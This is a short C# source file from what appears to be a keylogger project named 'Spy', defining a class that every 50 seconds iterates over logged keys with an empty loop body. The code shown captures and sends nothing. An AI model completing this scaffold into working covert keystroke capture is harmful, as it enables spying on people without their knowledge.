using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Spy.Input;

namespace Spy
{
    public static class InputPuller
    {
        public const int msPullRate = 50_000; // Pulls input every 50s

        public static async Task Refresh()
        {
            foreach (Keys key in Keylogger.loggedKeys)
            {

            }
            await Task.Delay(msPullRate);
        }

    }
}
